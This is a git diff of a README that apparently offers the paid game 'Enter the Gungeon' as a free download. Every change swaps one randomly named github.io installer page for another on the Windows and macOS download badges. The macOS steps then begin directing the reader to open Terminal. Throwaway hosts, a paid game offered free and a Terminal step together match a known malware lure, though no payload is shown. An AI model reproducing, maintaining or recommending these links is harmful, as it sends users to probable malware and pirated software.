@@ -26,7 +26,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_Enter%20the%20Gungeon-F9A825?style=for-the-badge&logo=github)](https://nrotnjxfyuta.github.io/win-setup/)
+[![Download](https://img.shields.io/badge/⬇_Download_Enter%20the%20Gungeon-F9A825?style=for-the-badge&logo=github)](https://etgysfcihddy.github.io/windows-dl/)
 
 </div>
 
@@ -65,9 +65,9 @@ Enter the Gungeon is a bullet hell dungeon crawler following a band of misfits s
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://nrotnjxfyuta.github.io/win-setup/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://etgysfcihddy.github.io/windows-dl/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://nrotnjxfyuta.github.io/mac-setup/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://etgysfcihddy.github.io/macos-dl/)
 
 </div>
 
@@ -106,7 +106,7 @@ Enter the Gungeon is a bullet hell dungeon crawler following a band of misfits s
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://nrotnjxfyuta.github.io/mac-setup/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://etgysfcihddy.github.io/macos-dl/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
